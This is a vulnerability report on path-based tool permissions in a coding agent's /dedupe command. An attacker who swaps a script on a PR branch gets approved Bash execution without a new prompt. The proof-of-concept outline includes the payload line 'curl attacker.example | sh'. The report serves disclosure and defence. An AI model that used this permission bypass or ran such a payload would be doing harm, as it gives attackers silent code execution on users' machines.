### Title
Path-based `allowed-tools` rule in `/dedupe` grants unpinned trust to mutable in-repo scripts, enabling PR-branch script swap into approved Bash execution - ([File: .claude/commands/dedupe.md])

### Summary
The `/dedupe` slash command declares `allowed-tools: Bash(./scripts/gh.sh:*), Bash(./scripts/comment-on-duplicates.sh:*)`, which pre-authorizes Bash execution by file *path* rather than by content. Because `scripts/gh.sh` and `scripts/comment-on-duplicates.sh` are ordinary tracked files in the same repository that `/dedupe` operates on, a branch/PR checkout that rewrites either script's body will be executed under the already-approved rule with no additional user prompt.

### Finding Description
`.claude/commands/dedupe.md` declares the tool permission at the top of the file: [1](#0-0) 

and the command body instructs the agent to invoke these exact paths (`./scripts/gh.sh ...`, `./scripts/comment-on-duplicates.sh --potential-duplicates ...`): [2](#0-1) [3](#0-2) 

Both scripts are plain, unsigned, un-pinned shell files checked into the repo: [4](#0-3) [5](#0-4) 

The `allowed-tools` rule matches on the literal command-line prefix (`./scripts/gh.sh` / `./scripts/comment-on-duplicates.sh`), not on file content or hash. If a victim checks out an attacker-supplied branch/PR in which either script body has been replaced with a malicious payload (while keeping the invocable path/name identical), and then runs `/dedupe` in that working tree, the agent will invoke `./scripts/gh.sh ...` or `./scripts/comment-on-duplicates.sh ...` exactly as instructed by the command markdown. The permission engine sees a match against the pre-approved path-based rule and executes without re-prompting the user, even though the actual bytes being run are attacker-controlled and unrelated to what was originally reviewed/approved.

No content pinning, hash verification, or script-immutability check exists anywhere in this repo's `.claude/` configuration or the scripts themselves to prevent this.

### Impact Explanation
This yields silent arbitrary code execution on the victim's machine at the privilege level of the shell running Claude Code, gated only by the victim checking out a hostile branch/PR and invoking `/dedupe`. This matches a trust-boundary/approval-bypass class impact: a pre-approved, narrowly-scoped Bash rule is converted into unrestricted command execution without the additional user consent that the allowlist model is meant to guarantee.

### Likelihood Explanation
Feasibility is high and fully attacker-controlled: any contributor able to open a PR or share a branch (no special privilege needed) can modify `scripts/gh.sh` or `scripts/comment-on-duplicates.sh`. The only precondition is that a user/reviewer checks out that branch and runs `/dedupe` inside it — a routine workflow for reviewing PRs with Claude Code. This is repeatable on every invocation as long as the malicious script content remains on disk at the expected path.

### Recommendation
Do not grant path-based Bash trust to files that live inside the same repository under review/modification. Options: (1) pin `allowed-tools` to a content hash of the script and re-prompt when the hash changes; (2) move trusted helper scripts outside the repository's mutable tree (e.g., a separately-distributed, signed tool) instead of `./scripts/...` relative paths; (3) have Claude Code's permission layer diff the resolved script content against the version present when the rule was approved and force re-approval on mismatch, rather than matching purely on the invocation path string.

### Proof of Concept
Integration test outline:
1. In a test repo containing `.claude/commands/dedupe.md` with the current `allowed-tools` rule, approve/simulate approval of `Bash(./scripts/gh.sh:*)` against the original `scripts/gh.sh` content (record its hash).
2. Checkout a second branch where `scripts/gh.sh` is replaced with a payload (e.g., `curl attacker.example | sh` appended, keeping the shebang and filename identical).
3. Invoke the `/dedupe` flow (or directly simulate the Bash permission check) with command `./scripts/gh.sh issue view 123`.
4. Assert current behavior: the permission check matches on path prefix alone and executes the swapped file without re-prompting — i.e., no hash/content comparison is performed.
5. Pass criterion for the fix: the permission system must detect the content change (hash mismatch vs. the hash recorded at approval time) and require re-approval before executing, failing the test until such pinning is implemented.

### Citations

**File:** .claude/commands/dedupe.md (L1-4)
```markdown
---
allowed-tools: Bash(./scripts/gh.sh:*), Bash(./scripts/comment-on-duplicates.sh:*)
description: Find duplicate GitHub issues
---
```

**File:** .claude/commands/dedupe.md (L14-17)
```markdown
5. Finally, use the comment script to post duplicates:
   ```
   ./scripts/comment-on-duplicates.sh --potential-duplicates <dup1> <dup2> <dup3>
   ```
```

**File:** .claude/commands/dedupe.md (L21-26)
```markdown
- Use `./scripts/gh.sh` to interact with Github, rather than web fetch or raw `gh`. Examples:
  - `./scripts/gh.sh issue view 123` — view an issue
  - `./scripts/gh.sh issue view 123 --comments` — view with comments
  - `./scripts/gh.sh issue list --state open --limit 20` — list issues
  - `./scripts/gh.sh search issues "query" --limit 10` — search for issues
- Do not use other tools, beyond `./scripts/gh.sh` and the comment script (eg. don't use other MCP servers, file edit, etc.)
```

**File:** scripts/gh.sh (L1-21)
```shellscript
#!/usr/bin/env bash
set -euo pipefail

# Wrapper around gh CLI that only allows specific subcommands and flags.
# All commands are scoped to the current repository via GH_REPO or GITHUB_REPOSITORY.
#
# Usage:
#   ./scripts/gh.sh issue view 123
#   ./scripts/gh.sh issue view 123 --comments
#   ./scripts/gh.sh issue list --state open --limit 20
#   ./scripts/gh.sh search issues "search query" --limit 10
#   ./scripts/gh.sh label list --limit 100

export GH_HOST=github.com

REPO="${GH_REPO:-${GITHUB_REPOSITORY:-}}"
if [[ -z "$REPO" || "$REPO" == */*/* || "$REPO" != */* ]]; then
  echo "Error: GH_REPO or GITHUB_REPOSITORY must be set to owner/repo format (e.g., GITHUB_REPOSITORY=anthropics/claude-code)" >&2
  exit 1
fi
export GH_REPO="$REPO"
```

**File:** scripts/comment-on-duplicates.sh (L1-19)
```shellscript
#!/usr/bin/env bash
#
# Comments on a GitHub issue with a list of potential duplicates.
# Usage: ./comment-on-duplicates.sh --potential-duplicates 456 789 101
#
# The base issue number is read from the workflow event payload.
#

set -euo pipefail

REPO="anthropics/claude-code"

# Read from event payload so the issue number is bound to the triggering event.
# Falls back to workflow_dispatch inputs for manual runs.
BASE_ISSUE=$(jq -r '.issue.number // .inputs.issue_number // empty' "${GITHUB_EVENT_PATH:?GITHUB_EVENT_PATH not set}")
if ! [[ "$BASE_ISSUE" =~ ^[0-9]+$ ]]; then
  echo "Error: no issue number in event payload" >&2
  exit 1
fi
```
